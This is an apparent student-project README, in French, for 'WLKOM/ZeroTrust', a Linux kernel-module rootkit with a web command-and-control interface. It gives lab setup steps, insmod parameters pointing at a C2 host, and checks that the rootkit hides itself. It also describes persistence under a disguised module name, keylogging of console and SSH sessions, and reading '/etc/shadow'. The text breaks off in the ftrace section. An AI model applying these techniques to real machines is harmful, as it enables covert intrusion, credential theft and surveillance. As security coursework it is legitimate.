<p align="center">
  <img src="https://img.shields.io/badge/Kernel-Linux%206.1-orange?style=for-the-badge&logo=linux&logoColor=white" />
  <img src="https://img.shields.io/badge/Language-C%20%7C%20Python-blue?style=for-the-badge&logo=c&logoColor=white" />
  <img src="https://img.shields.io/badge/Crypto-ChaCha20--Poly1305-green?style=for-the-badge&logo=letsencrypt&logoColor=white" />
  <img src="https://img.shields.io/badge/UI-FastAPI%20%2B%20WebSocket-teal?style=for-the-badge&logo=fastapi&logoColor=white" />
  <img src="https://img.shields.io/badge/OS-Debian%2012-red?style=for-the-badge&logo=debian&logoColor=white" />
</p>

<h1 align="center">ZeroTrust</h1>
<h3 align="center">Wild Linux Kernel Object Module</h3>

<p align="center">
  <i>Rootkit Linux sous forme de module noyau (LKM) avec interface de commande et controle (C2) web.</i>
</p>

<p align="center">
  <b>EPITA - SYS2 - APPING1</b>
</p>

---

> **Avertissement** : Ce projet est realise dans un cadre strictement educatif (projet EPITA SYS2).
> L'utilisation de rootkits en dehors d'un environnement de test controle est illegale.

---

## Table des matieres

| # | Section | Description |
|---|---------|-------------|
| 1 | [Presentation du projet](#1---presentation-du-projet) | Vue d'ensemble, architecture, fonctionnalites |
| 2 | [Pre-requis](#2---pre-requis) | Materiel, logiciels, connaissances |
| 3 | [Installation de la virtualisation](#3---installation-de-lenvironnement-de-virtualisation) | QEMU/KVM sur Arch Linux, Ubuntu, Debian |
| 4 | [Creation des machines virtuelles](#4---creation-des-machines-virtuelles) | Telechargement ISO, creation VM, installation Debian |
| 5 | [Configuration VM Victime](#5---configuration-de-la-vm-victime) | Outils de compilation, headers noyau |
| 6 | [Configuration VM Attaquante](#6---configuration-de-la-vm-attaquante) | Python, venv, dependances |
| 7 | [Compilation du rootkit](#7---compilation-du-rootkit) | make, verification du .ko |
| 8 | [Deploiement du rootkit](#8---deploiement-du-rootkit) | insmod, parametres, verification |
| 9 | [Lancement du C2](#9---lancement-du-c2) | Demarrage serveur, connexion rootkit |
| 10 | [Utilisation de l'interface web](#10---utilisation-de-linterface-web) | Login, navigation, chaque panneau |
| 11 | [Fonctionnalites du rootkit](#11---fonctionnalites-du-rootkit) | Hooks, dissimulation, keylogger, protocole |
| 12 | [Fonctionnalites du C2](#12---fonctionnalites-du-c2) | API, WebSocket, architecture |
| 13 | [Architecture technique](#13---architecture-technique) | Structure du code, flux d'execution |
| 14 | [Chiffrement](#14---securite-et-chiffrement) | ChaCha20-Poly1305, derivation cle, format trames |
| 15 | [Depannage](#15---depannage) | Problemes courants et solutions |
| 16 | [Structure du projet](#16---structure-du-projet) | Arborescence, dependances |

---

## 1 - Presentation du projet

### Qu'est-ce que WLKOM ?

WLKOM est un **rootkit Linux** qui fonctionne comme un **module noyau** (LKM - Loadable Kernel Module). Il s'installe sur une machine cible (la "victime") et permet a un attaquant de la controler a distance via une interface web.

### Comment ca marche (en resume)

```
                          RESEAU LOCAL (NAT libvirt)
                         192.168.122.0/24

  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │    VM ATTAQUANTE                       VM VICTIME                │
  │    Debian 12                           Debian 12                 │
  │    192.168.122.96                      192.168.122.18            │
  │                                                                  │
  │   ┌──────────────────┐    TCP chiffre   ┌──────────────────┐    │
  │   │                  │   ChaCha20-P1305 │                  │    │
  │   │   Serveur C2     │◄────────────────►│   wlkom.ko       │    │
  │   │   (Python)       │   port 9999      │   (module noyau) │    │
  │   │                  │   port 9998      │                  │    │
  │   │   FastAPI        │                  │   ftrace hooks   │    │
  │   │   + WebSocket    │                  │   keylogger      │    │
  │   │   port 8080      │                  │   persistance    │    │
  │   │                  │                  │                  │    │
  │   └────────┬─────────┘                  └──────────────────┘    │
  │            │                                                     │
  └────────────┼─────────────────────────────────────────────────────┘
               │
               │ HTTP / WebSocket (port 8080)
               │
        ┌──────┴──────┐
        │  Navigateur  │
        │  web (hote)  │
        │  Firefox /   │
        │  Chromium    │
        └─────────────┘
```

**En 3 etapes simples :**

1. On charge le module `wlkom.ko` dans le noyau de la victime
2. Le rootkit se connecte automatiquement au serveur C2 de l'attaquant
3. L'attaquant controle la victime depuis son navigateur web

### Tableau des fonctionnalites et points

| Fonctionnalite | Status | Methode | Points |
|:---|:---:|:---|:---:|
| Compilation du module | Done | Makefile + linux-headers | **0.5** |
| Connexion persistante au C2 | Done | TCP auto-reconnect 5s | **3.0** |
| Persistence au reboot | Done | modules-load.d + modprobe.d | **1.5** |
| Execution de commandes | Done | call_usermodehelper + /tmp/.wlkom_out | **5.0** |
| Mot de passe (non hardcode) | Done | SHA-256 hash via module_param | **1.0** |
| Upload (attaquant vers victime) | Done | Protocole UPLOAD: taille + chunks | **1.5** |
| Download (victime vers attaquant) | Done | Protocole FILE: + chunks + EOF | **1.5** |
| Cacher module de lsmod | Done | list_del() + kobject_del() | **1.0** |
| Cacher lignes dans fichiers | Done | Hook sys_read via ftrace | **2.0** |
| Cacher fichiers/dossiers de ls | Done | Hook sys_getdents64 via ftrace | **2.0** |
| Chiffrement reseau | Done | ChaCha20-Poly1305 AEAD | **1.0** |
| | | **TOTAL** | **20.0** |

### Bonus implementes (hors bareme)

| Bonus | Description |
|:---|:---|
| Interface web C2 complete | Dashboard temps reel avec 15+ panneaux |
| Keylogger | keyboard_notifier + TTY sniffer (SSH inclus) |
| Cache de ss/netstat | Hook sys_recvmsg sur NETLINK_SOCK_DIAG |
| Cache de /proc/net/tcp | Filtrage hex du port/IP C2 |
| Cache PID de ps | Hook getdents64 sur /proc |
| Navigateur de fichiers | Browse, view, upload, download, delete |
| Gestionnaire de processus | ps + kill depuis l'interface |
| Sniffer reseau | tcpdump integre |
| Mapping MITRE ATT&CK | Techniques cartographiees |
| Deploy/Uninstall a distance | Compilation + chargement depuis le web |

---

## 2 - Pre-requis

### Materiel necessaire

| Composant | Minimum | Recommande |
|:---|:---|:---|
| RAM | 6 Go | 8 Go ou plus |
| Disque libre | 15 Go | 25 Go |
| CPU | Virtualisation (VT-x / AMD-V) | 4 coeurs |
| Reseau | Non requis (tout est local) | - |

> **Comment verifier la virtualisation ?**
> ```bash
> # Si cette commande affiche un nombre > 0, votre CPU supporte la virtualisation
> egrep -c '(vmx|svm)' /proc/cpuinfo
> ```

### Logiciels sur la machine hote

La machine hote = votre PC physique (le laptop de l'ecole sous Arch Linux par exemple).

| Logiciel | Role | Comment verifier |
|:---|:---|:---|
| QEMU/KVM | Hyperviseur (execute les VMs) | `qemu-system-x86_64 --version` |
| libvirt | Gestion des VMs | `virsh --version` |
| virt-manager | Interface graphique pour les VMs | `virt-manager --version` |
| SSH client | Connexion aux VMs | `ssh -V` |
| Navigateur web | Acceder au C2 | Firefox / Chromium |

### Systeme des VMs

Les deux VMs utilisent **Debian 12 (Bookworm)**.

| | VM Victime | VM Attaquante |
|:---|:---|:---|
| **OS** | Debian 12 | Debian 12 |
| **Noyau** | 6.1.0-44-amd64 | 6.1.0-49-amd64 |
| **Role** | Execute le rootkit | Execute le C2 |
| **IP** | 192.168.122.18 | 192.168.122.96 |
| **Credentials** | root / root | root / root |

> **Pourquoi Debian 12 (Bookworm) et pas une version plus recente ?**
>
> - **Noyau 6.1 LTS** : version Long Term Support maintenue jusqu'en decembre 2026. Le kernel 6.1 est la derniere version LTS compatible avec `ftrace_set_filter_ip()` sans modifications majeures de l'API. Les noyaux plus recents (6.5+) ont modifie certaines structures internes de ftrace (cf. commit `dda4d22`), ce qui compliquerait le code de hooking sans apporter de benefice pour un rootkit pedagogique.
> - **Headers noyau stables** : les `linux-headers-6.1.0-*` sont disponibles directement via `apt`, ce qui evite de compiler un noyau custom. Les versions rolling-release (Arch, Fedora) changent de noyau a chaque mise a jour, cassant potentiellement la compilation du module.
> - **API crypto noyau** : le module `chacha20poly1305` (`<crypto/chacha20poly1305.h>`) est present et fonctionnel dans le 6.1. Certaines distributions plus recentes ont deplace ou renomme ces headers.
> - **`kallsyms_lookup_name` non exporte depuis Linux 5.7** : on utilise la technique `kprobe` pour resoudre les symboles, qui fonctionne de maniere fiable sur le 6.1 (pas de restrictions supplementaires comme sur le 6.6+ avec `CONFIG_SECURITY_LOCKDOWN`).
> - **Reproductibilite** : Debian 12.0.0 est une version fige (archivee sur `cdimage.debian.org`). N'importe qui peut telecharger exactement le meme ISO et obtenir le meme environnement, contrairement a une version "current" qui evolue.
> - **Sources** : [Kernel LTS releases](https://www.kernel.org/category/releases.html), [Debian 12 release notes](https://www.debian.org/releases/bookworm/releasenotes)

---

## 3 - Installation de l'environnement de virtualisation

### Option A : Arch Linux (laptop de l'ecole)

**Etape 1** - Installer les paquets :

```bash
sudo pacman -S qemu-full virt-manager libvirt dnsmasq ebtables
```

**Etape 2** - Activer le service libvirt :

```bash
sudo systemctl enable --now libvirtd
```

**Etape 3** - Ajouter votre utilisateur au groupe libvirt :

```bash
sudo usermod -aG libvirt $(whoami)
```

> **Important** : Deconnectez-vous de votre session et reconnectez-vous pour que le changement prenne effet.

**Etape 4** - Activer le reseau virtuel par defaut :

```bash
sudo virsh net-start default
sudo virsh net-autostart default
```

**Etape 5** - Verifier :

```bash
virsh list --all
```

> Si cette commande s'execute sans erreur (meme si la liste est vide), tout est bon.

---

### Option B : Ubuntu / Debian

**Etape 1** - Installer les paquets :

```bash
sudo apt update
sudo apt install -y qemu-kvm libvirt-daemon-system virt-manager bridge-utils
```

**Etape 2** - Activer le service :

```bash
sudo systemctl enable --now libvirtd
```

**Etape 3** - Ajouter l'utilisateur au groupe :

```bash
sudo usermod -aG libvirt $(whoami)
```

**Etape 4** - Deconnexion / reconnexion puis verifier :

```bash
virsh list --all
```

---

### Vérification finale

Si vous voyez un tableau (meme vide), l'installation est reussie :

```
 Id   Name   State
-----------------------
```

Si vous avez une erreur du type `Failed to connect to the hypervisor`, verifiez que libvirtd tourne :

```bash
sudo systemctl status libvirtd
```

---

## 4 - Creation des machines virtuelles

### 4.1 - Telecharger l'ISO Debian 12

Lien de telechargement :

```
https://cdimage.debian.org/cdimage/archive/12.0.0/amd64/iso-cd/
```

Telecharger le fichier `debian-12.0.0-amd64-netinst.iso` (~600 Mo).

```bash
cd ~/Downloads
wget https://cdimage.debian.org/cdimage/archive/12.0.0/amd64/iso-cd/debian-12.0.0-amd64-netinst.iso
```

> C'est le meme ISO pour les deux VMs (attaquante et victime). Une seule copie suffit.

Verifiez que le fichier est bien telecharge :

```bash
ls -lh ~/Downloads/debian-12*.iso
```

---

### 4.2 - Creer la VM Victime

**Etape 1** - Ouvrez virt-manager :

```bash
virt-manager
```

<!-- SCREENSHOT: virt-manager fenetre principale -->
<!-- ![virt-manager](screenshots/virt-manager-main.png) -->

**Etape 2** - Cliquez sur le bouton **"+"** (Creer une nouvelle machine virtuelle) en haut a gauche.

**Etape 3** - Source d'installation :
- Selectionnez : **"Media d'installation local (image ISO ou CDROM)"**
- Cliquez **Suivant**

**Etape 4** - Selectionnez l'ISO :
- Cliquez **Parcourir** → **Parcourir en local**
- Naviguez vers `~/Downloads/` et selectionnez l'ISO Debian 12 telechargee
- Le systeme detecte automatiquement "Debian 12"
- Cliquez **Suivant**

<!-- SCREENSHOT: selection de l'ISO dans virt-manager -->
<!-- ![ISO selection](screenshots/virt-manager-iso.png) -->

**Etape 5** - Memoire et CPU :
```
Memoire (RAM) : 2048 Mo
CPUs          : 2
```
- Cliquez **Suivant**

**Etape 6** - Stockage :
```
Creer un disque pour la VM : 10 Go
```
- Cliquez **Suivant**

**Etape 7** - Parametres finaux :
```
Nom : victim
```
- Cochez : **"Personnaliser la configuration avant l'installation"**
- Reseau : verifiez que c'est **"Reseau virtuel 'default' : NAT"**
- Cliquez **Terminer**

<!-- SCREENSHOT: configuration finale VM (nom, reseau) -->
<!-- ![VM config](screenshots/virt-manager-config.png) -->

**Etape 8** - Dans la fenetre de configuration qui s'ouvre, cliquez **"Commencer l'installation"** en haut a gauche.

---

### 4.3 - Installer Debian 12 (pour chaque VM)

L'installateur Debian se lance. Suivez ces etapes :

| Etape | Choix |
|:---|:---|
| Langue | Francais (ou English) |
| Pays | France |
| Clavier | Francais (azerty) |
| Nom de la machine | `victim` (ou `attacker` pour la 2e VM) |
| Nom de domaine | *(laisser vide)* |
| Mot de passe root | `root` |
| Creer un utilisateur | *(optionnel, on utilisera root)* |
| Partitionnement | **"Assiste - utiliser un disque entier"** |
| Schema de partition | **"Tout dans une seule partition"** |
| Miroir Debian | Voir ci-dessous |
| Proxy | *(laisser vide)* |
| Popularity contest | Non |

**Configuration du miroir Debian :**

- Selectionnez `France` → `deb.debian.org`.
- **Si ca boucle** (retour a l'ecran precedent) : la VM n'a pas acces a internet. Choisissez **"Revenir en arriere"** puis **"Continuer sans miroir reseau"**. Vous configurerez le miroir apres l'installation (voir ci-dessous).

**Selection des logiciels** (ecran important) :

- **DECOCHEZ TOUT** sauf :
  - [x] Serveur SSH
  - [x] Utilitaires usuels du systeme
- Pas besoin d'environnement de bureau graphique

**Installation de GRUB** :
- Installer GRUB sur le disque principal : **Oui**
- Peripherique : `/dev/vda`

Attendez la fin de l'installation, retirez l'ISO et redemarrez.

**Si vous avez saute l'etape du miroir** : apres le reboot, connectez-vous en root et executez :

```bash
cat > /etc/apt/sources.list << 'EOF'
deb http://deb.debian.org/debian bookworm main
deb http://deb.debian.org/debian bookworm-updates main
deb http://security.debian.org/debian-security bookworm-security main
EOF
apt update
apt install -y openssh-server
```

Cela configure le miroir et installe le serveur SSH (necessaire pour la suite).

---

### 4.4 - Creer la VM Attaquante

Repetez **exactement** les etapes 4.2 et 4.3, avec cette seule difference :

| Parametre | VM Victime | VM Attaquante |
|:---|:---|:---|
| Nom de la VM | `victim` | `attacker` |
| Hostname | `victim` | `attacker` |
| Mot de passe root | `root` | `root` |

Tout le reste est identique (2 Go RAM, 2 CPUs, 10 Go disque, Debian 12, meme selection de logiciels).

---

### 4.5 - Recuperer les adresses IP

Une fois les deux VMs demarrees, connectez-vous avec `root` / `root` sur chaque VM et executez :

```bash
ip -4 addr show enp1s0 | grep inet
```

> Le nom de l'interface peut varier (`enp1s0`, `ens3`, `eth0`...). Utilisez `ip addr` pour la trouver.

Notez les adresses IP. Exemple :

| VM | IP |
|:---|:---|
| Victime | `192.168.122.18` |
| Attaquante | `192.168.122.96` |

> Les IPs sont attribuees par DHCP. Dans la suite de ce document, **remplacez les IPs par les votres** si elles sont differentes.

### 4.6 - Tester la connectivite

Depuis la **machine hote** (votre PC) :

```bash
# Ping la VM Attaquante
ping -c 2 192.168.122.96

# Ping la VM Victime
ping -c 2 192.168.122.18
```

Depuis la **VM Attaquante** :

```bash
# Ping la VM Victime
ping -c 2 192.168.122.18
```

> Les 3 commandes doivent reussir. Si le ping echoue, verifiez que le reseau `default` de libvirt est actif (`sudo virsh net-start default`).

---

## 5 - Configuration de la VM Victime

Connectez-vous a la VM Victime.

> **Important** : Par defaut, Debian n'autorise PAS la connexion SSH directe en tant que root.
> Il faut d'abord se connecter avec le compte utilisateur cree pendant l'installation, puis passer root.

```bash
# 1. Se connecter en tant qu'utilisateur normal
ssh user@192.168.122.18
# Mot de passe : celui choisi a l'installation

# 2. Une fois connecte, passer root
su -
# Mot de passe : root (celui choisi a l'installation)
```

> A partir de maintenant, toutes les commandes sont executees en **root** dans la VM.

### 5.1 - Installer les outils de compilation

```bash
apt update
apt install -y build-essential linux-headers-$(uname -r) gcc make
```

### 5.2 - Verifier l'installation

```bash
# Verifier que les headers du noyau sont installes
ls /lib/modules/$(uname -r)/build/Makefile
```

> Si le fichier existe, les headers sont OK.

```bash
# Verifier le compilateur
gcc --version
# Doit afficher : gcc (Debian 12.2.0-14) 12.2.0 ou similaire

# Verifier make
make --version
# Doit afficher : GNU Make 4.3 ou similaire

# Verifier la version du noyau
uname -r
# Doit afficher : 6.1.0-44-amd64 ou similaire
```

### 5.3 - Creer le repertoire de travail

```bash
mkdir -p /root/wlkom/rootkit
```

---

## 6 - Configuration de la VM Attaquante

Connectez-vous a la VM Attaquante (meme methode que pour la victime) :

```bash
# 1. Se connecter en tant qu'utilisateur normal
ssh user@192.168.122.96
# Mot de passe : celui choisi a l'installation

# 2. Passer root
su -
# Mot de passe : root
```

### 6.1 - Installer Python et les outils

```bash
apt update
apt install -y python3 python3-venv python3-pip sshpass
```

### 6.2 - Creer l'environnement virtuel Python

```bash
python3 -m venv /opt/wlkom-c2
```

### 6.3 - Installer les dependances Python

```bash
/opt/wlkom-c2/bin/pip install fastapi uvicorn[standard] websockets cryptography
```

### 6.4 - Verifier l'installation

```bash
/opt/wlkom-c2/bin/python3 -c "
import fastapi, uvicorn, websockets
print('FastAPI   :', fastapi.__version__)
print('Uvicorn   :', uvicorn.__version__)
print('WebSockets:', websockets.__version__)
print('=> Tout est OK')
"
```

Sortie attendue :
```
FastAPI   : 0.136.1
Uvicorn   : 0.47.0
WebSockets: 16.0
=> Tout est OK
```

### 6.5 - Creer l'arborescence

```bash
mkdir -p /opt/wlkom-c2/server
mkdir -p /opt/wlkom-c2/rootkit
```

---

## 7 - Compilation du rootkit

### 7.1 - Copier les sources vers la VM Victime

Depuis la **machine hote**, dans le repertoire du projet :

```bash
cd wlkom/

# Copier le code source vers la VM Victime
scp rootkit/wlkom.c user@192.168.122.18:/tmp/
scp rootkit/Makefile user@192.168.122.18:/tmp/
```

Ensuite, connectez-vous a la VM et deplacez les fichiers en root :

```bash
ssh user@192.168.122.18
su -
# Mot de passe : root
mv /tmp/wlkom.c /root/wlkom/rootkit/
mv /tmp/Makefile /root/wlkom/rootkit/
```

### 7.2 - Compiler

Toujours en root dans la VM Victime :

```bash
cd /root/wlkom/rootkit
make
```

**Sortie attendue :**

```
make -C /lib/modules/6.1.0-44-amd64/build M=/root/wlkom/rootkit modules
make[1]: Entering directory '/usr/src/linux-headers-6.1.0-44-amd64'
  CC [M]  /root/wlkom/rootkit/wlkom.o
  MODPOST /root/wlkom/rootkit/Module.symvers
  CC [M]  /root/wlkom/rootkit/wlkom.mod.o
  LD [M]  /root/wlkom/rootkit/wlkom.ko
make[1]: Leaving directory '/usr/src/linux-headers-6.1.0-44-amd64'
```

### 7.3 - Verifier

```bash
# Le fichier doit exister et peser environ 300-500 Ko
ls -lh /root/wlkom/rootkit/wlkom.ko

# Verifier les infos du module
modinfo /root/wlkom/rootkit/wlkom.ko
```

Sortie de `modinfo` :

```
filename:       /root/wlkom/rootkit/wlkom.ko
version:        1.4
description:    Wild Linux Kernel Object Module
author:         wlkom
license:        GPL
parm:           pw_hash:charp
parm:           c2_ip:charp
parm:           c2_port:int
```

<!-- SCREENSHOT: compilation reussie (sortie make + modinfo) -->
<!-- ![Compilation](screenshots/compilation.png) -->

### 7.4 - Nettoyage (optionnel)

Pour supprimer les fichiers intermediaires :

```bash
make clean
```

> Cela supprime tout sauf `wlkom.c` et `Makefile`. Relancez `make` pour recompiler.

---

## 8 - Deploiement du rootkit

### 8.1 - Choisir un mot de passe

Le rootkit utilise un mot de passe pour l'authentification. Ce mot de passe n'est **pas stocke en clair** dans le module : on passe uniquement son **hash SHA-256**.

Calculez le hash de votre mot de passe :

```bash
echo -n "wlkom2024" | sha256sum | awk '{print $1}'
```

> Remplacez `wlkom2024` par le mot de passe de votre choix.

Le hash ressemble a : `a1b2c3d4e5f6...` (64 caracteres hexadecimaux).

### 8.2 - Charger le rootkit

Sur la **VM Victime** :

```bash
insmod /root/wlkom/rootkit/wlkom.ko \
  pw_hash="$(echo -n 'wlkom2024' | sha256sum | awk '{print $1}')" \
  c2_ip="192.168.122.96" \
  c2_port=9999
```

**Explication des parametres :**

| Parametre | Description | Exemple |
|:---|:---|:---|
| `pw_hash` | Hash SHA-256 du mot de passe | `$(echo -n 'wlkom2024' \| sha256sum \| awk '{print $1}')` |
| `c2_ip` | IP de la VM Attaquante | `192.168.122.96` |
| `c2_port` | Port d'ecoute du C2 | `9999` |

> **Remplacez** `192.168.122.96` par l'IP reelle de votre VM Attaquante !

### 8.3 - Verifier le chargement

```bash
dmesg | tail -10
```

**Sortie attendue** (visible uniquement juste apres le chargement) :

```
[xxx.xxx] wlkom: module loaded
[xxx.xxx] wlkom: persistence set
[xxx.xxx] wlkom: module hidden
[xxx.xxx] wlkom: hide files active (ftrace)
[xxx.xxx] wlkom: hide lines active (ftrace)
[xxx.xxx] wlkom: crypto ready (chacha20-poly1305)
[xxx.xxx] wlkom: net hiding ready (port=270F ip=...)
[xxx.xxx] wlkom: ss hiding active (recvmsg hook)
[xxx.xxx] wlkom: keylogger started
[xxx.xxx] wlkom: C2 thread started
```

> **Attention** : une fois actif, le rootkit filtre `dmesg` et ces lignes disparaissent !

<!-- SCREENSHOT: sortie dmesg apres chargement du rootkit -->
<!-- ![dmesg](screenshots/dmesg-loaded.png) -->

### 8.4 - Verifier la dissimulation

Apres quelques secondes, le rootkit se cache completement :

```bash
# Module invisible dans lsmod
lsmod | grep wlkom
# (aucun resultat = OK)

# Module invisible dans /proc/modules
cat /proc/modules | grep wlkom
# (aucun resultat = OK)

# Module invisible dans /sys/module
ls /sys/module/ | grep wlkom
# (aucun resultat = OK)

# Fichiers du rootkit caches dans ls
ls /root/wlkom/
# (dossier semble vide = OK)

# Connexion cachee dans ss
ss -tnp | grep 9999
# (aucun resultat = OK)
```

<!-- SCREENSHOT: preuves de dissimulation (lsmod vide, ls vide, ss vide) -->
<!-- ![Stealth proof](screenshots/stealth-proof.png) -->

### 8.5 - Persistence au reboot

Le rootkit configure **automatiquement** sa persistence lors du premier chargement. Voici ce qu'il fait :

```
1. Copie wlkom.ko → /lib/modules/$(uname -r)/extra/zroot.ko
2. Cree /etc/modules-load.d/zroot.conf     (chargement auto au boot)
3. Cree /etc/modprobe.d/zroot.conf          (parametres : hash, IP, port)
4. Execute depmod -a                        (met a jour la base des modules)
```

Apres un reboot de la VM Victime, le rootkit se charge automatiquement et se reconnecte au C2.

> **Nom "zroot"** : le module est copie sous le nom `zroot.ko` pour la discretion (pas de reference a "wlkom" dans les fichiers de config).

---

## 9 - Lancement du C2

### 9.1 - Copier le C2 sur la VM Attaquante

Depuis la **machine hote** :

```bash
cd wlkom/

# Copier les fichiers vers la VM Attaquante
scp attacking_program/c2.py user@192.168.122.96:/tmp/
scp rootkit/wlkom.c user@192.168.122.96:/tmp/
```

Connectez-vous et deplacez les fichiers en root :

```bash
ssh user@192.168.122.96
su -
# Mot de passe : root
mv /tmp/c2.py /opt/wlkom-c2/server/c2.py
mv /tmp/wlkom.c /opt/wlkom-c2/rootkit/wlkom.c
```

### 9.2 - Demarrer le serveur C2

Toujours en root dans la **VM Attaquante** :

**Option A** - Lancement au premier plan (voir les logs en direct) :

```bash
/opt/wlkom-c2/bin/python3 /opt/wlkom-c2/server/c2.py
```

**Option B** - Lancement en arriere-plan (le serveur continue meme si vous fermez le terminal) :

```bash
nohup /opt/wlkom-c2/bin/python3 /opt/wlkom-c2/server/c2.py > /tmp/c2.log 2>&1 &
```

Pour consulter les logs :

```bash
cat /tmp/c2.log
```

**Sortie attendue au demarrage :**

```
INFO:     Started server process [XXXX]
INFO:     Waiting for application startup.
INFO:     Application startup complete.
INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
[C2] Crypto key derived (ChaCha20-Poly1305)
[C2] Rootkit listener on port 9999
[C2] Command listener on port 9998
```

### 9.3 - Connexion automatique du rootkit

Si le rootkit est deja charge sur la victime, il se connecte **automatiquement** en moins de 5 secondes.

Vous verrez dans les logs :

```
[C2] Rootkit connected from ('192.168.122.18', XXXXX)
```

### 9.4 - Acceder a l'interface web

Ouvrez un navigateur sur la **machine hote** et allez a :

```
http://192.168.122.96:8080
```

> Remplacez `192.168.122.96` par l'IP de votre VM Attaquante.

<!-- SCREENSHOT: logs du C2 au demarrage + connexion rootkit -->
<!-- ![C2 startup](screenshots/c2-startup-logs.png) -->

---

## 10 - Utilisation de l'interface web

### 10.1 - Authentification (deux niveaux)

L'interface a **deux niveaux de securite** :

---

**Niveau 1 : Mot de passe de la plateforme web**

| | |
|:---|:---|
| Quand | A l'ouverture de la page web |
| Mot de passe | `zerotrust` (modifiable dans Settings) |
| Tentatives | 3 avant verrouillage de 30 secondes |
| Session | Dure 1 heure, renouvelee a chaque action |

Entrez `zerotrust` et cliquez **Login**.

<!-- SCREENSHOT: page de login du C2 -->
<!-- ![Login page](screenshots/c2-login.png) -->

---

**Niveau 2 : Mot de passe du rootkit**

| | |
|:---|:---|
| Quand | Apres le login, dans le Terminal |
| Mot de passe | Celui choisi au chargement (`wlkom2024` dans cet exemple) |
| Affichage | Le terminal affiche `Password:` |

Allez dans **Terminal** (menu a gauche), le prompt affiche :

```
[*] Rootkit connected - password required
Password: _
```

Tapez le mot de passe du rootkit (ex: `wlkom2024`) et appuyez Entree.

```
[+] Authenticated successfully
root@victim:/# _
```

> Vous etes maintenant connecte avec un **acces root complet** a la machine victime.

<!-- SCREENSHOT: terminal apres authentification reussie -->
<!-- ![Terminal auth](screenshots/c2-terminal-auth.png) -->

---

### 10.2 - Les panneaux de l'interface

Voici la liste complete des panneaux accessibles depuis le menu lateral :

---

#### Dashboard

Vue d'ensemble du systeme.

| Information | Description |
|:---|:---|
| Connection status | Etat de la connexion avec le rootkit (connecte / deconnecte) |
| System info | OS, noyau, hostname, uptime de la victime |
| Metrics | CPU, RAM, disque de la victime |

<!-- SCREENSHOT: dashboard avec status connecte -->
<!-- ![Dashboard](screenshots/c2-dashboard.png) -->

---

#### Terminal

Terminal interactif pour executer des commandes sur la victime.

Le terminal affiche pour chaque commande :
- **stdout** : la sortie standard de la commande
- **stderr** : les messages d'erreur (affiches en rouge)
- **exit status** : le code de retour (0 = succes, autre = erreur)

Exemples de commandes :

```bash
whoami                    # → root                    (exit: 0)
hostname                  # → victim                  (exit: 0)
ls -la /etc/              # → liste des fichiers      (exit: 0)
cat /etc/shadow           # → hashes des mots de passe(exit: 0)
cat /fichier/inexistant   # → stderr: No such file    (exit: 1)
ip addr                   # → interfaces reseau       (exit: 0)
ps aux                    # → processus en cours      (exit: 0)
```

**Commandes speciales :**

| Commande | Action |
|:---|:---|
| `cd <dossier>` | Change le repertoire courant |
| `upload <chemin>` | Envoie un fichier vers la victime |
| `download <chemin>` | Telecharge un fichier depuis la victime |
| `clear` | Efface l'ecran du terminal |

<!-- SCREENSHOT: terminal en action avec commandes executees -->
<!-- ![Terminal](screenshots/c2-terminal.png) -->

---

#### File System

Navigateur de fichiers de la machine victime.

| Action | Icone | Description |
|:---|:---:|:---|
| Naviguer | Clic sur dossier | Parcourir l'arborescence |
| Voir un fichier | **View** | Affiche le contenu texte |
| Telecharger fichier | **DL** | Telecharge sur votre machine |
| Telecharger dossier | **.tar.gz** | Archive le dossier et telecharge |
| Envoyer un fichier | **Upload** | Envoie un fichier depuis votre machine |
| Supprimer | Poubelle (rouge) | Supprime avec confirmation |

<!-- SCREENSHOT: navigateur de fichiers -->
<!-- ![File System](screenshots/c2-filesystem.png) -->

---

#### Processes

Liste des processus en cours sur la victime (equivalent de `ps aux`).

- Affiche : PID, utilisateur, CPU%, MEM%, commande
- Bouton **Kill** pour terminer un processus (envoie `SIGKILL`)

<!-- SCREENSHOT: liste des processus -->
<!-- ![Processes](screenshots/c2-processes.png) -->

---

#### Network

Informations reseau de la victime : interfaces, IP, routes, connexions.

---

#### Downloads

Liste des fichiers telecharges depuis la victime. Vous pouvez les sauvegarder sur votre machine.

---

#### Sniffer

Capture de paquets reseau sur la victime (utilise `tcpdump`).

- Demarre / arrete la capture
- Affiche les paquets en temps reel

---

#### Keylogger

Capture des frappes clavier de la victime.

| Source | Methode |
|:---|:---|
| Console physique | keyboard_notifier (noyau) |
| Sessions SSH | Hook sys_read sur TTY/PTY |

- Le keylogger demarre automatiquement au chargement du rootkit
- Bouton **Dump** pour recuperer le buffer

<!-- SCREENSHOT: keylogger avec frappes capturees -->
<!-- ![Keylogger](screenshots/c2-keylogger.png) -->

---

#### Modules

Liste des modules noyau charges sur la victime (equivalent de `lsmod`).

> `wlkom` n'apparait PAS dans cette liste (il est cache).

---

#### Stealth

Tableau de bord des capacites de dissimulation du rootkit.

Affiche l'etat de chaque mecanisme :
- Module cache de lsmod
- Module cache de /proc/modules et /sys/module
- Fichiers caches de ls
- Logs noyau filtres
- Connexion cachee de ss/netstat
- PID du kthread cache

<!-- SCREENSHOT: panneau stealth avec tous les statuts -->
<!-- ![Stealth](screenshots/c2-stealth.png) -->

---

#### Syscalls

Visualisation des hooks syscall actifs.

| Hook | Syscall | Role |
|:---|:---|:---|
| hk_getdents64 | `__x64_sys_getdents64` | Cache fichiers/PIDs |
| hk_read | `__x64_sys_read` | Filtre logs + capture TTY |
| hk_recvmsg | `__x64_sys_recvmsg` | Cache connexion de ss |

---

#### MITRE ATT&CK

Mapping des techniques MITRE ATT&CK utilisees par le rootkit :
- Initial Access, Execution, Persistence, Defense Evasion, Collection, Command & Control

---

#### Deploy

| Action | Description |
|:---|:---|
| **Compile** | Compile le rootkit a distance sur la victime |
| **Load** | Charge le module (insmod) |
| **Uninstall** | Decharge le module + supprime la persistence + nettoie |

<!-- SCREENSHOT: panneau deploy -->
<!-- ![Deploy](screenshots/c2-deploy.png) -->

---

#### Activity

Journal de toutes les actions effectuees. Export en JSON disponible.

---

#### Settings

| Parametre | Description |
|:---|:---|
| **Restart C2** | Redemarre le serveur C2 |
| **Reconnect rootkit** | Force la reconnexion |
| **Change password** | Modifie le mot de passe de la plateforme web |
| **Session info** | Duree de session, token actif |

---

## 11 - Fonctionnalites du rootkit

### 11.1 - Hooks syscall via ftrace

Le rootkit utilise **ftrace** pour intercepter les appels systeme. Ftrace est un mecanisme de tracage du noyau Linux qui permet de rediriger l'execution d'une fonction vers une fonction personnalisee.

**Principe :**

```
Programme userland
       │
       ▼
  Appel systeme (ex: getdents64)
